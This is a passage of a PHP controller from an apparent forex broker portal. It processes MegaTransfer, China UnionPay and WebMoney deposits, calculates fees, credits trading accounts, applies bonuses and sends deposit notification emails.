                'payment_date' => $paymentDate,
                'transaction_type' => $commentTransactionType,
                'payment_status	' => $payment_status,
                'currency_status' => $currencyStatus,
                'fee' => '',
                'isFailed' => 0,
                'type' => 'deposit-'.$isMicro.'-'.$_GET['bonus'],
            ];

//            if (IPLoc::APIUpgradeDevIP()) {
                $WebServiceNew = FXPP::DepositRealFund($account_number, $amountToDeposit, $this->comment_type['deposit'].$this->comment_transaction_type[$commentTransactionType].$transaction_id);
                $requestResult = $WebServiceNew['requestResult'];
                $ticket = $WebServiceNew['ticket'];
//            } else {
//                $WebService->update_live_deposit_balance($account_number, $amountToDeposit, $this->comment_type['deposit'].$this->comment_transaction_type[$commentTransactionType].$transaction_id);
//                $requestResult = $WebService->request_status;
//                $ticket = $WebService->get_result('Ticket');
//            }

            if ($requestResult === 'RET_OK') {
                $mt_ticket = $ticket;

                // Back Agent of Client
               // FXPP::BackAgentOfAccount($account_number);
                $conv_amount = $this->get_convert_amount($currency, $amountToDeposit);

                $transactionData = [
                    'amount' => $amountToDeposit,
                    'transaction_id' => $transaction_id,
                    'payment_date' => $paymentDate,
                    'status' => 2,
                    'mt_ticket' => $mt_ticket,
                    'conv_amount' => $conv_amount,
                    'payment_status' => $payment_status, //FXPP-7618
                    'currency_status' => $currencyStatus, //FXPP-7618
                ];
                $this->deposit_model->updateDepositTransactionData($order_id, $transactionData);

                if ($paymentMethod == 'CC') {
                    $computeMegaTransferFee = $this->computeMegaTransferFee($amount, $currency, $isMicro);
                    $conv_amount_fee_usd = $this->get_convert_amount($currency, $computeMegaTransferFee);
//                    $WebService3 = new WebService($config);

//                    if (IPLoc::APIUpgradeDevIP()) {
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $computeMegaTransferFee, $this->comment_type['deposit_fee'].$this->comment_transaction_type[$commentTransactionType].$transaction_id);
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];
//                    } else {
//                        $WebService3->update_live_deposit_balance($account_number, $computeMegaTransferFee, $this->comment_type['deposit_fee'].$this->comment_transaction_type[$commentTransactionType].$transaction_id);
//                        $requestResult = $WebService3->request_status;
//                        $ticket = $WebService3->get_result('Ticket');
//                    }

                    if ($requestResult === 'RET_OK') {
                        $mt_ticket_fee = $ticket;

                        $payment_fee = [
                            'transaction_id' => $transaction_id,
                            'reference_id' => $order_id,
                            'status' => 2,
                            'amount' => $computeMegaTransferFee,
                            'currency' => $currency,
                            'user_id' => $user_id,
                            'payment_date' => $paymentDate,
                            'transaction_type' => 'MEGATRANSFER',
                            'conv_amount' => $conv_amount_fee_usd,
                            'mt_ticket' => $mt_ticket_fee,
                            'payment_status' => $payment_status, //FXPP-7618
                            'currency_status' => $currencyStatus, //FXPP-7618
                        ];
                        $this->deposit_model->insertPayment($payment_fee);
                    }

                    if ($requestResult != 'RET_OK') {
                        $insertDepositFailed['comment'] = $requestResult;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }
                }

                if ($paymentMethod == 'CH') {
                    $computeMegaTransferFee = $responseArray['amount'] - $responseArray['amount_credited']; //$this->computeMegaTransferFee($amount, $currency);
                    $conv_amount_fee_usd = $this->get_convert_amount($currency, $computeMegaTransferFee);
                    $WebService3 = new WebService($config);

//                    if (IPLoc::APIUpgradeDevIP()) {
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $computeMegaTransferFee, $this->comment_type['deposit_fee'].$this->comment_transaction_type[$commentTransactionType].$transaction_id);
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];
//                    } else {
//                        $WebService3->update_live_deposit_balance($account_number, $computeMegaTransferFee, $this->comment_type['deposit_fee'].$this->comment_transaction_type[$commentTransactionType].$transaction_id);
//                        $requestResult = $WebService3->request_status;
//                        $ticket = $WebService3->get_result('Ticket');
//                    }

                    if ($requestResult === 'RET_OK') {
                        $mt_ticket_fee = $ticket;

                        $payment_fee = [
                            'transaction_id' => $transaction_id,
                            'reference_id' => $order_id,
                            'status' => 2,
                            'amount' => $computeMegaTransferFee,
                            'currency' => $currency,
                            'user_id' => $user_id,
                            'payment_date' => $paymentDate,
                            'transaction_type' => 'CHINAUNIONPAY',
                            'conv_amount' => $conv_amount_fee_usd,
                            'mt_ticket' => $mt_ticket_fee,
                            'payment_status' => $payment_status, //FXPP-8580
                            'currency_status' => $currencyStatus, //FXPP-8580
                        ];
                        $this->deposit_model->insertPayment($payment_fee);
                    }

                    if ($requestResult != 'RET_OK') {
                        $insertDepositFailed['comment'] = $requestResult;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }
                }

                $isMicro = $this->account_model->isMicro($user_id);
                if ($commentTransactionType == 'MEGATRANSFER_CC') {
                    /**  Use original amount to Cent accounts for  auto-reports**/
                    $processed_amount = floatval($conv_amount) + floatval($conv_amount_fee_usd);
                    if ($isMicro) {
                        $processed_amount = floatval($processed_amount / 100);
                    }
                }
                if ($commentTransactionType == 'CHINAUNIONPAY') {
                    // $processed_amount = $conv_amount;
                    $processed_amount = floatval($conv_amount) + floatval($conv_amount_fee_usd);
                    if ($isMicro) {
                        $processed_amount = floatval($processed_amount / 100);
                    }
                }

                if ($commentTransactionType == 'MEGATRANSFER') {
                    $processed_amount = $conv_amount;
                    if ($isMicro) {
                        $processed_amount = floatval($processed_amount / 100);
                    }
                }

                if ($paymentMethod == 'CC') {
                    $type = 'MegaTransfer Card Payments';
                } elseif ($paymentMethod == 'CH') {
                    $type = 'MegaTransfer China Union Pay Payments';
                } else {
                    $type = 'MegaTransfer Payments';
                }

                $fundsDepositDetails = [
                    'processed_amount' => $processed_amount,
                    'user_id' => $user_id,
                    'account_number' => $account_number,
                    'transaction_comment' => $this->comment_type['deposit'].$this->comment_transaction_type[$commentTransactionType].$transaction_id,
                    'transaction_type' => 'MEGATRANSFER', //'Neteller'
                ];

                $insertDepositFailed['comment'] = 'Deposit Report Log';
                $insertDepositFailed['details'] = json_encode($fundsDepositDetails);
                $this->general_model->insert('no_status_transaction', $insertDepositFailed);

//                    if($user_id != 135835 ) {
//                        $type = 'MegaTransfer Card Payments';
                $this->sendEmailAfterSuccessDeposit($type, $processed_amount, $account_number, $user_id, $this->comment_type['deposit'].$this->comment_transaction_type[$commentTransactionType].$transaction_id);
//                    }

                /** Save unprocessed bonus**/
                $RequestLogintype = $this->account_model->getAccountLoginType($user_id);
                if (isset($_GET['bonus']) && !empty($_GET['bonus'])) {
                    if ($RequestLogintype['login_type'] != 1) {
                        $this->insertUnprocessedBonus($user_id, $account_number, $amount, $commentTransactionType, $_GET['bonus'], $transaction_id);
                    }
                }
                /* End **/

                if (isset($_GET['bonus']) && !empty($_GET['bonus'])) {
//                    if ($_GET['bonus'] === 'hpb') {
//                        // 100% bonus
//                        FXPP::Deposit100PercentBonus($user_id, $account_number, $amount, $commentTransactionType, 'hplb', $transaction_id);
//                    } elseif ($_GET['bonus'] === 'rhpb') {
//                        FXPP::DepositRegular100PercentBonus($user_id, $account_number, $amount, $commentTransactionType, 'rhpb', $transaction_id, $maxNumofDeposit);
//                    } else {
//                        FXPP::DepositBonus($user_id, $account_number, $amount, $commentTransactionType, $_GET['bonus'], $transaction_id);
//                    }
                    self::applyDepositBonus($user_id, $account_number, $amount, $commentTransactionType, $_GET['bonus'], $transaction_id, false);
                }

                // Bonus Profit and NDB cancellation **/
                $bonuses = FXPP::getAccountBonusByType($account_number);
                if ($RequestLogintype['login_type'] != 1) {
                    if ($amount > 0 and $bonuses[2] > 0) {
                        FXPP::BonusProfitCancellation($user_id, $account_number, $amount, $transaction_id);
                    }
                }

                // Bonus Profit Logs**/
                $ndbProfitLogs = [
                    'Account_number' => $account_number,
                    'DepAmount' => $amount,
                    'UserId' => $user_id,
                    'TransactionId' => $transaction_id,
                    'ndbbonus' => $bonuses[2],
                ];
                $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                $insertProfitLogs = [
                    'logs' => $encodeNdbProfitLogs,
                    'User_Id' => $user_id,
                ];

                $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                $WebService4 = new WebService($config);
                $WebService4->request_live_account_balance($account_number);
                if ($WebService4->request_status === 'RET_OK') {
                    $balance = $WebService4->get_result('Balance');
                    if ($logtype == 1) {
                        $updatedAccountBalance = $this->account_model->updatePartnerAccountBalance($account_number, $balance);
                    } else {
                        $updatedAccountBalance = $this->account_model->updateAccountBalance($account_number, $balance);
                    }

                    $insDataArray = [
                        'Response' => json_encode($updatedAccountBalance),
                        'Test' => $this->session->userdata('login_type').'-'.$logtype.'-'.$account_number.'-'.$balance,
                    ];
                    $this->deposit_model->testresponsemegatransfer($insDataArray);
                }

                if ($WebService4->request_status != 'RET_OK') {
                    $insertDepositFailed['comment'] = $WebService4->request_status;
                    $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                }
            }

            if ($requestResult != 'RET_OK') {
                $insertDepositFailed['comment'] = $requestResult;
                $this->general_model->insert('no_status_transaction', $insertDepositFailed);
            }

            //  }
        } else {
            if ($this->session->userdata('login_type') == 1) {
                $account_detail = $this->account_model->getAccountByPartnerId2($this->session->userdata('user_id'));
            } else {
                $account_detail = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
            }
            $email_details = [
                'account_number' => $account_detail['account_number'],
                'type' => 'MegaTransfer',
                'reason' => $responseArray['message'],
            ];
            $this->sendEmailFailedDeposit($email_details);

            $transactionData = [
                'transaction_id' => 0,
                'status' => 1,
                'note' => $responseArray['message'],
            ];
            $this->deposit_model->updateDepositTransactionData($order_id, $transactionData);
        }
    }

    private function computeMegaTransferFee($amount, $currency = 'USD', $isMicro)
    {
        $currencyFee = [
            'USD' => 0.50,
            'EUR' => 0.50,
            'GBP' => 0.50,
            'RUB' => 30,
        ];

        $currFee = $currencyFee[$currency];
        if ($isMicro) {
            $currFee = $currencyFee[$currency] *= 100;
        }

        $fixedInterest = 0.039;

        $computeFixedInterest = $amount * $fixedInterest;
        $totalFee = $computeFixedInterest + $currFee;

        if ($totalFee > 0) {
            return $totalFee;
        }

        return 0;
    }

    public function megatransfer_creditcard_success()
    {
        //      0 - form, 1 - success, 2 - failed
        $this->session->set_flashdata('d_mt_display', 1);
        redirect('deposit/megatransfer-credit-card');
    }

    public function megatransfer_success()
    {
        //      0 - form, 1 - success, 2 - failed
        $this->session->set_flashdata('d_mt_display', 1);
        redirect(FXPP::loc_url('deposit/megatransfer'));
    }

    public function chinaUnionPay_success()
    {
        //      0 - form, 1 - success, 2 - failed
        $this->session->set_flashdata('d_mt_display', 1);
        redirect(FXPP::loc_url('deposit/chinaUnionPay'));
    }


    public function sendEmailAfterSuccessDepositManual($date,$type, $conv_amount, $account_number, $user_id, $comment, $currency = null)
    {
        $deposit_date = date('Y-m-d H:i:s', strtotime($date));
        $user_info = $this->general_model->showssingle('user_profiles', 'user_id', $user_id, 'country,full_name');
        $user_tag = $this->general_model->showssingle('users', 'id', $user_id, 'test,test_1');
        $dbInfo = $this->account_model->getAffiliateDetailsByUserId($user_id);
    
        if ($dbInfo['referral_affiliate_code']) {

            $agentData = $this->account_model->getAccountNumberByCode($dbInfo['referral_affiliate_code']);
            $agentAccountNumber = ($agentData['account_number'] > 0) ? $agentData['account_number'] : 0 ;
            $dbInfoAgent = $this->general_model->showssingle('user_profiles', 'user_id', $agentData['users_id'], 'full_name');
            $agentFullName = $dbInfoAgent['full_name'];
        }else{
            $apiInfo = $this->getUserdetails_old($account_number);
            $agentAccountNumber = $apiInfo['Agent'];
            if($agentAccountNumber != 0){
                $apiInfoAgent = $this->getUserdetails_old($agentAccountNumber);
                $agentFullName = $apiInfoAgent['Name'];
            }
    
        }
     

        /*$apiInfo = $this->getUserdetails($account_number);
     
        if ($apiInfo['Agent'] == 0) {
            $agentNumber = null;

         
            if ($dbInfo['referral_affiliate_code']) {
                $agentId = $this->general_model->showssingle('users_affiliate_code', 'affiliate_code', $dbInfo['referral_affiliate_code'], 'users_id');
                $agentAcct = $this->general_model->showssingle('mt_accounts_set', 'user_id', $agentId['users_id'], 'account_number');
                $agentNumber = $agentAcct['account_number'];
                $dbInfoAgent = $this->general_model->showssingle('user_profiles', 'user_id', $agentId['users_id'], 'full_name');
                $agentFullName = $dbInfoAgent['full_name'];
            }
        } else {
            $agentNumber = $apiInfo['Agent'];
            $apiInfoAgent = $this->getUserdetails($agentNumber);
            $agentFullName = $apiInfoAgent['Name'];
        }*/


    
        $count = $this->deposit_model->getNumberOfDepositsByUser($user_id);

        $email_data = [
                'deposit_date' => $deposit_date,
                'type' => $type,
                'title' => '['.$type.']['.$conv_amount.'] - ACC ['.$account_number.']',
                'amount' => number_format($conv_amount, 2, '.', ''),
                'account_number' => $account_number,
                'full_name' => $user_info['full_name'],
                'ip' => $this->input->ip_address(),
                'country' => $this->general_model->getCountries($user_info['country']),
                'agent' => empty($agentAccountNumber) ? 'N/A' : $agentFullName.' - ACC ['.$agentAccountNumber.']',
                'comment' => $comment,
                'count' => $count,
            ];

            echo '<pre>';
            print_r($email_data);

         
        if ($user_tag['test'] != 1) {
            //real deposit report
            $this->load->library('Fx_mailer');
            Fx_mailer::successful_deposit($email_data, $currency);
        } else {
            //test deposit report
            $this->load->library('Fx_mailer');
            Fx_mailer::successful_deposit_test($email_data, $currency);
        }
    }



    public function sendEmailAfterSuccessDeposit($type, $conv_amount, $account_number, $user_id, $comment, $currency = null)
    {
        $deposit_date = date('Y-m-d H:i:s', strtotime('now'));
        $user_info = $this->general_model->showssingle('user_profiles', 'user_id', $user_id, 'country,full_name');
        $user_tag = $this->general_model->showssingle('users', 'id', $user_id, 'test,test_1');
        $dbInfo = $this->account_model->getAffiliateDetailsByUserId($user_id);
    
        if ($dbInfo['referral_affiliate_code']) {

            $agentData = $this->account_model->getAccountNumberByCode($dbInfo['referral_affiliate_code']);
            $agentAccountNumber = ($agentData['account_number'] > 0) ? $agentData['account_number'] : 0 ;
            $dbInfoAgent = $this->general_model->showssingle('user_profiles', 'user_id', $agentData['users_id'], 'full_name');
            $agentFullName = $dbInfoAgent['full_name'];
        }else{
            $apiInfo = $this->getUserdetails_old($account_number);
            $agentAccountNumber = $apiInfo['Agent'];
            if($agentAccountNumber != 0){
                $apiInfoAgent = $this->getUserdetails_old($agentAccountNumber);
                $agentFullName = $apiInfoAgent['Name'];
            }
    
        }
     

        /*$apiInfo = $this->getUserdetails($account_number);
     
        if ($apiInfo['Agent'] == 0) {
            $agentNumber = null;

         
            if ($dbInfo['referral_affiliate_code']) {
                $agentId = $this->general_model->showssingle('users_affiliate_code', 'affiliate_code', $dbInfo['referral_affiliate_code'], 'users_id');
                $agentAcct = $this->general_model->showssingle('mt_accounts_set', 'user_id', $agentId['users_id'], 'account_number');
                $agentNumber = $agentAcct['account_number'];
                $dbInfoAgent = $this->general_model->showssingle('user_profiles', 'user_id', $agentId['users_id'], 'full_name');
                $agentFullName = $dbInfoAgent['full_name'];
            }
        } else {
            $agentNumber = $apiInfo['Agent'];
            $apiInfoAgent = $this->getUserdetails($agentNumber);
            $agentFullName = $apiInfoAgent['Name'];
        }*/


    
        $count = $this->deposit_model->getNumberOfDepositsByUser($user_id);

        $email_data = [
                'deposit_date' => $deposit_date,
                'type' => $type,
                'title' => '['.$type.']['.$conv_amount.'] - ACC ['.$account_number.']',
                'amount' => number_format($conv_amount, 2, '.', ''),
                'account_number' => $account_number,
                'full_name' => $user_info['full_name'],
                'ip' => $this->input->ip_address(),
                'country' => $this->general_model->getCountries($user_info['country']),
                'agent' => empty($agentAccountNumber) ? 'N/A' : $agentFullName.' - ACC ['.$agentAccountNumber.']',
                'comment' => $comment,
                'count' => $count,
            ];

         
        if ($user_tag['test'] != 1) {
            //real deposit report
            $this->load->library('Fx_mailer');
            Fx_mailer::successful_deposit($email_data, $currency);
        } else {
            //test deposit report
            $this->load->library('Fx_mailer');
            Fx_mailer::successful_deposit_test($email_data, $currency);
        }
    }

    
    public function sendEmailAfterSuccessDepositTest($type, $conv_amount, $account_number, $user_id, $comment, $currency = null)
    {
        $deposit_date = date('Y-m-d H:i:s', strtotime('now'));
        $user_info = $this->general_model->showssingle('user_profiles', 'user_id', $user_id, 'country,full_name');
        $user_tag = $this->general_model->showssingle('users', 'id', $user_id, 'test,test_1');
        $dbInfo = $this->account_model->getAffiliateDetailsByUserId($user_id);
    
        if ($dbInfo['referral_affiliate_code']) {

            $agentData = $this->account_model->getAccountNumberByCode($dbInfo['referral_affiliate_code']);
            $agentAccountNumber = ($agentData['account_number'] > 0) ? $agentData['account_number'] : 0 ;
            $dbInfoAgent = $this->general_model->showssingle('user_profiles', 'user_id', $agentData['users_id'], 'full_name');
            $agentFullName = $dbInfoAgent['full_name'];
        }else{
            $apiInfo = $this->getUserdetails_old($account_number);
            $agentAccountNumber = $apiInfo['Agent'];
            if($agentAccountNumber != 0){
                $apiInfoAgent = $this->getUserdetails_old($agentAccountNumber);
                $agentFullName = $apiInfoAgent['Name'];
            }
        }
     

        /*$apiInfo = $this->getUserdetails($account_number);
     
        if ($apiInfo['Agent'] == 0) {
            $agentNumber = null;

         
            if ($dbInfo['referral_affiliate_code']) {
                $agentId = $this->general_model->showssingle('users_affiliate_code', 'affiliate_code', $dbInfo['referral_affiliate_code'], 'users_id');
                $agentAcct = $this->general_model->showssingle('mt_accounts_set', 'user_id', $agentId['users_id'], 'account_number');
                $agentNumber = $agentAcct['account_number'];
                $dbInfoAgent = $this->general_model->showssingle('user_profiles', 'user_id', $agentId['users_id'], 'full_name');
                $agentFullName = $dbInfoAgent['full_name'];
            }
        } else {
            $agentNumber = $apiInfo['Agent'];
            $apiInfoAgent = $this->getUserdetails($agentNumber);
            $agentFullName = $apiInfoAgent['Name'];
        }*/


    
        $count = $this->deposit_model->getNumberOfDepositsByUser($user_id);

        $email_data = [
                'deposit_date' => $deposit_date,
                'type' => $type,
                'title' => '['.$type.']['.$conv_amount.'] - ACC ['.$account_number.']',
                'amount' => number_format($conv_amount, 2, '.', ''),
                'account_number' => $account_number,
                'full_name' => $user_info['full_name'],
                'ip' => $this->input->ip_address(),
                'country' => $this->general_model->getCountries($user_info['country']),
                'agent' => empty($agentAccountNumber) ? 'N/A' : $agentFullName.' - ACC ['.$agentAccountNumber.']',
                'comment' => $comment,
                'count' => $count,
            ];
        

           

         
        /*if ($user_tag['test'] != 1) {
            //real deposit report
            $this->load->library('Fx_mailer');
            Fx_mailer::successful_deposit($email_data, $currency);
        } else {*/
            //test deposit report
            $this->load->library('Fx_mailer');
            Fx_mailer::successful_deposit_test($email_data, $currency);
        //}
    }


    public function sendEmailAfterSuccessDeposit3($type, $conv_amount, $account_number, $user_id, $comment, $currency = null)
    {
        $user_info = $this->general_model->showssingle('user_profiles', 'user_id', $user_id, 'country');
        $user_tag = $this->general_model->showssingle('users', 'id', $user_id, 'test,test_1');
        $agent_account_number = '';

        // Retrieve account's agent information
//        $referral_aff_code = $this->account_model->getUserReferralCode($user_id);
//
//        if ($referral_aff_code['referral_affiliate_code'] != null || !empty($referral_aff_code['referral_affiliate_code'])) {
//            $agent_info = $this->account_model->getUserAffiliateAgent($referral_aff_code['referral_affiliate_code']);
//            if ($this->account_model->getAccountByPartnerId($agent_info['user_id'])) {
//                $agent_account_number = $this->account_model->getAccountByPartnerId($agent_info['user_id']);
//            } else if ($this->account_model->getAccountByUserId($agent_info['user_id'])) {
//                $agent_account_number = $this->account_model->getAccountByUserId($agent_info['user_id']);
//            } else {
//                $agent_account_number = array();
//            }
//        } else {
//            $agent_info = null;
//            $agent_account_number = null;
//        }

        $apiInfo = $this->getUserdetails($account_number);
        if ($apiInfo['Agent'] == 0) {
            $agentNumber = null;
        } else {
            $agentFullName = $apiInfo['Name'];
            $agentNumber = $apiInfo['Agent'];
        }

        $count = $this->deposit_model->getNumberOfDepositsByUser($user_id);

        if ($type === 'Skrill') {
            $count = $count + 1;
        }

        $email_data = [
            'type' => $type,
            'title' => '['.$type.']['.$conv_amount.'] - ACC ['.$account_number.']',
            'amount' => $conv_amount,
            'account_number' => $account_number,
            'ip' => $this->input->ip_address(),
            'country' => $this->general_model->getCountries($user_info['country']),
            //'agent'          => $agent_info == null ? 'N/A' : $agent_info['full_name'] . ' - ACC [' . $agent_account_number['account_number'] . ']',
            'agent' => $agentNumber == null ? 'N/A' : $agentFullName.' - ACC ['.$agentNumber.']',
            'comment' => $comment,
            'count' => $count,
            'user_tags' => 'test: '.$user_tag['test'].' | test_1: '.$user_tag['test_1'],
        ];

//        if ($this->isArabicCountry($user_id)) {
//            /**FXPP-9820*/
//            $email_data['agent'] = '58000948';
//        }

        $this->load->library('Fx_mailer');
        Fx_mailer::successful_deposit2($email_data, $currency);
        Fx_mailer::FXPP_11949($email_data, $currency);
    }

    public function sendEmailAfterSuccessDeposit2($type, $conv_amount, $account_number, $user_id, $comment, $currency = null)
    {
        $user_info = $this->general_model->showssingle('user_profiles', 'user_id', $user_id, 'country');
        $user_tag = $this->general_model->showssingle('users', 'id', $user_id, 'test,test_1');
        $agent_account_number = '';

        // Retrieve account's agent information
        $referral_aff_code = $this->account_model->getUserReferralCode($user_id);

        if ($referral_aff_code['referral_affiliate_code'] != null || !empty($referral_aff_code['referral_affiliate_code'])) {
            $agent_info = $this->account_model->getUserAffiliateAgent($referral_aff_code['referral_affiliate_code']);
            if ($result = $this->account_model->getAccountByPartnerId($agent_info['user_id'])) {
                $agent_account_number = $result;
            } elseif ($result = $this->account_model->getAccountByUserId($agent_info['user_id'])) {
                $agent_account_number = $result;
            }
        } else {
            $agent_info = null;
            $agent_account_number = null;
        }

        $count = $this->deposit_model->getNumberOfDepositsByUser($user_id);

        //    if ($user_tag['test'] != 1 && $user_tag['test_1'] != 0) {
        $email_data = [
            'type' => $type,
            'title' => '['.$type.']['.$conv_amount.'] - ACC ['.$account_number.']',
            'amount' => number_format($conv_amount, 2, '.', ''),
            'account_number' => $account_number,
            'ip' => $this->input->ip_address(),
            'country' => $this->general_model->getCountries($user_info['country']),
            'agent' => $agent_info == null ? 'N/A' : $agent_info['full_name'].' - ACC ['.$agent_account_number['account_number'].']',
            'comment' => $comment,
            'count' => $count,
            'user_tags' => 'test: '.$user_tag['test'].' | test_1: '.$user_tag['test_1'],
        ];

        if ($this->isArabicCountry($user_id)) {
            /**FXPP-9820*/
            $email_data['agent'] = '58000948';
        }

        $this->load->library('Fx_mailer');
        Fx_mailer::successful_deposit2($email_data, $currency);
        //  }
    }

    public function sendEmailAfterSuccessDeposit_test1($type, $conv_amount, $account_number, $user_id, $comment, $currency = null)
    {
        $user_info = $this->general_model->showssingle('user_profiles', 'user_id', $user_id, 'country');
        $user_tag = $this->general_model->showssingle('users', 'id', $user_id, 'test,test_1');
        $agent_account_number = '';

        // Retrieve account's agent information
        $referral_aff_code = $this->account_model->getUserReferralCode($user_id);

        if ($referral_aff_code['referral_affiliate_code'] != null || !empty($referral_aff_code['referral_affiliate_code'])) {
            $agent_info = $this->account_model->getUserAffiliateAgent($referral_aff_code['referral_affiliate_code']);
            if ($this->account_model->getAccountByPartnerId($agent_info['user_id'])) {
                $agent_account_number = $this->account_model->getAccountByPartnerId($agent_info['user_id']);
            } elseif ($this->account_model->getAccountByUserId($agent_info['user_id'])) {
                $agent_account_number = $this->account_model->getAccountByUserId($agent_info['user_id']);
            }
        } else {
            $agent_info = null;
            $agent_account_number = null;
        }

        $count = $this->deposit_model->getNumberOfDepositsByUser($user_id);

        if ($type === 'Skrill') {
            $count = $count + 1;
        }

        $email_data = [
            'type' => $type,
            'title' => '['.$type.']['.$conv_amount.'] - ACC ['.$account_number.']',
            'amount' => number_format($conv_amount, 2, '.', ''),
            'account_number' => $account_number,
            'ip' => $this->input->ip_address(),
            'country' => $this->general_model->getCountries($user_info['country']),
            'agent' => $agent_info == null ? 'N/A' : $agent_info['full_name'].' - ACC ['.$agent_account_number['account_number'].']',
            'comment' => $comment,
            'count' => $count,
        ];

        echo '<pre>';
        print_r($email_data);
        echo '</pre>';
        exit;
    }

    public function test_sendEmailAfterSuccessDeposit()
    {
        $user_info = $this->general_model->showssingle('user_profiles', 'user_id', '86391', 'country');
        $agent_account_number = '';

        // Retrieve account's agent information
        $referral_aff_code = $this->account_model->getUserReferralCode('86391');

        if ($referral_aff_code['referral_affiliate_code'] != null || !empty($referral_aff_code['referral_affiliate_code'])) {
            $agent_info = $this->account_model->getUserAffiliateAgent($referral_aff_code['referral_affiliate_code']);
            if ($this->account_model->getAccountByPartnerId($agent_info['user_id'])) {
                $agent_account_number = $this->account_model->getAccountByPartnerId($agent_info['user_id']);
            } elseif ($this->account_model->getAccountByUserId($agent_info['user_id'])) {
                $agent_account_number = $this->account_model->getAccountByUserId($agent_info['user_id']);
            }
        } else {
            $agent_info = null;
            $agent_account_number = null;
        }

        $count = $this->deposit_model->getNumberOfDepositsByUser('86391');

        $email_data = [
            'type' => 'Test',
            'title' => 'Test',
            'amount' => floatval(0),
            'account_number' => 0,
            'ip' => $this->input->ip_address(),
            'country' => $this->general_model->getCountries($user_info['country']),
            'agent' => $agent_info == null ? 'N/A' : $agent_info['full_name'].' - ACC ['.$agent_account_number['account_number'].']',
            'comment' => 'Test',
            'count' => $count,
        ];

        $this->load->library('Fx_mailer');
        Fx_mailer::test_successful_deposit($email_data);
    }

    public function sendEmailFailedDeposit_v2($data)
    {
        $this->load->library('Fx_mailer');
        $user_info = $this->account_model->getUserDetailsByAccountNumber($data['account_number']);
        $login_type = isset($data['login_type']) ? $data['login_type'] : '';

        if (!$user_info) {
            $user_info = $this->account_model->getUserDetailsByAccountNumber_partner($data['account_number']);
        }

        $details = [
            'account_number' => $data['account_number'],
            'time' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
            'payment_type' => $data['type'],
            'reason' => empty($data['reason']) ? 'N/A' : $data['reason'],
            'transaction_id' => $data['transaction_id'],
            'country' => $this->general_model->getCountries($user_info['country']),
        ];

        $details['login_type'] = $login_type;
        Fx_mailer::test_failed_deposit($details);
    }

    public function sendEmailFailedDeposit($data)
    {
        $this->load->library('Fx_mailer');
        $user_info = $this->account_model->getUserDetailsByAccountNumber($data['account_number']);
        $login_type = isset($data['login_type']) ? $data['login_type'] : '';

        if (!$user_info) {
            $user_info = $this->account_model->getUserDetailsByAccountNumber_partner($data['account_number']);
        }

        $details = [
            'account_number' => $data['account_number'],
            'time' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
            'payment_type' => $data['type'],
            'reason' => empty($data['reason']) ? 'N/A' : $data['reason'],
            'transaction_id' => $data['transaction_id'],
            'country' => $this->general_model->getCountries($user_info['country']),
        ];

        if ($data['account_number'] == 1013466) {
            $details['country'] = json_encode($user_info);
            Fx_mailer::test_failed_deposit($details);
        } else {
            if (($user_info['test'] == 1 && $user_info['test_1'] == 0) || $data['login_type'] == 1) {
                $details['login_type'] = $login_type;
                Fx_mailer::test_failed_deposit($details);
            } else {
                Fx_mailer::failed_deposit($details);
            }
        }

        // just inform client interested.
        FXPP::failedDepositInformer();
    }

    public function webmoney_transfer()
    {
        if ($this->session->userdata('logged') && $this->input->is_ajax_request()) {
            $error = [];
            $data = [];
            $isSuccess = false;
            $isValidationError = true;

            $user_id = $this->session->userdata('user_id');
            $amount = $this->input->post('amount', true);
            $bonus = $this->input->post('bonus_input', true);

            /* FXPP-6333
            $isMicro = $this->account_model->isMicro($user_id);
            if($isMicro){
                $amount /= 100;
            }
             FXPP-6333 */

            if ($this->session->userdata('login_type') == 1) {
                $currency = $this->g_m->showssingle('partnership', 'partner_id', $user_id, 'currency,reference_num');
                $conv_amount = $this->get_convert_amount($currency['currency'], $amount);
                $currency_conv = $currency['currency'];
                $acc_number = $currency['reference_num'];
            } else {
                $currency = $this->g_m->showssingle('mt_accounts_set', 'user_id', $user_id, 'mt_currency_base,account_number');
                $conv_amount = $this->get_convert_amount($currency['mt_currency_base'], $amount);
                $currency_conv = $currency['mt_currency_base'];
                $acc_number = $currency['account_number'];
            }

            $currencyStatus = $this->currency_status[$currency_conv];
            $isMicro = $this->account_model->isMicro($user_id);
            if ($isMicro) {
                $currencyStatus = $this->currency_status['Cents'];
            }

            //Validation for NDB accounts with Bonus Profit
//            $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($this->session->userdata('user_id'));
//            $hasInNdbBonus = $this->NodepositBonusValidation($this->session->userdata('user_id'));
//            if ($hasInNdbBonus == 2) { //has Ndb Bonus
//                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//            }

            //$this->form_validation->set_rules('amount', 'Amount', 'trim|numeric|required|xss_clean');
            $this->form_validation->set_rules('amount', 'Deposit amount', "trim|required|deposit_min_amount[$currency_conv]");

            if ($this->form_validation->run()) {
                //if (!$data['CurPendValidation']['TradeError'] || $ndb_status) { //FXPP-5960

                FXPP::isEUPayment('deposit/webmoney');
                $date = new DateTime();

                // Save to Deposit table
                $deposit_insert = [
                        'transaction_id' => 0,
                        'reference_id' => $date->getTimestamp(),
                        'status' => 0,
                        'amount' => $amount,
                        'currency' => $currency_conv,
                        'user_id' => $user_id,
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'note' => 'Webmoney Deposit',
                        'transaction_type' => 'WEBMONEY',
                        'conv_amount' => $conv_amount,
                        'payment_status' => $this->paymentType_status['Deposit via WebMoney'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                    ];

                $id = $this->g_m->insert('deposit', $deposit_insert);

                // Save to WebMoney Deposit table
                $data['webmoney_insert'] = [
                        'deposit_id' => $id,
                        'merchant_purse' => 'Z881361183723', // Current merchant purse used
                        'purchase_num' => 'FpY9i4W',
                    ];
                $this->g_m->insert('webmoney_deposit', $data['webmoney_insert']);

                $data['details'] = [
